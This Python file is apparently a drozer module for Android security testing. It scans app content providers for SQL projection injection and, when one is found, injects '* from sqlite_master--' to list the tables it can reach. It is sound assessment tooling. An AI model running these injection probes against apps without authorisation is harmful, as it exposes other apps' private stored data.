from pydiesel.reflection import ReflectionException

from drozer.modules import common, Module
from output import Output

class SqlTables(Module, common.FileSystem, common.PackageManager, common.Provider, common.Strings, common.ZipFile):

    name = "Find tables accessible through SQL injection vulnerabilities."
    description = "Enumerate SQL tables accessible through SQL (projection) Injection vulnerabilities."
    examples = ""
    author = "Rijnard"
    date = "2013-01-23"
    license = "BSD (3 clause)"
    path = ["mscanner", "provider"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    def add_arguments(self, parser):
        parser.add_argument("-a", "--package", "--uri", dest="package_or_uri", help="specify a package, or content uri to search", metavar="<package or uri>")
        
    def execute(self, arguments):
        appname = arguments.package_or_uri
        opHlr = Output(appname)

        node_SqlTables = opHlr.insert("SqlTables")

        results = []
        if arguments.package_or_uri != None and arguments.package_or_uri.startswith("content://"):
            results.append(self.__test_uri(arguments.package_or_uri, opHlr, node_SqlTables))
        else:
            for uri in self.findAllContentUris(arguments.package_or_uri):
                results.append(self.__test_uri(uri, opHlr, node_SqlTables))
        
        if results: 
            self.stdout.write('\n'.join(filter(None, results)) + '\n')
        else:
            node_table = opHlr.insert("Table", None, node_SqlTables)
            self.stdout.write("No results found.\n")
            opHlr.insert("item", "No results found.", node_table)
        opHlr.write()
    def __test_uri(self, uri, opHlr, node_SqlTables):
        try:
            self.contentResolver().query(uri, projection=["'"])
        except ReflectionException as e:
            if e.message.find("unrecognized token") >= 0: # if there's a projection injection
                try:
                    node_table = opHlr.insert("Table", None, node_SqlTables)
                    opHlr.insert("Uri", uri, node_table)
                    cursor = self.contentResolver().query(uri, projection=["* from sqlite_master--"])
                    resultSet = self.getResultSet(cursor)
                    listOfTables = filter(lambda x: str(x[0]) == "table", resultSet[1:]) # exclude indexes
                    str_table_list = ", ".join(str(x[1]) for x in listOfTables)
                    # print str_table_list
                    opHlr.insert("Table_List", str_table_list, node_table)
                    return "Accessible tables for uri " + uri + ":\n  " + \
                                   "\n  ".join(str(x[1]) for x in listOfTables) + "\n"
                except:
                    pass
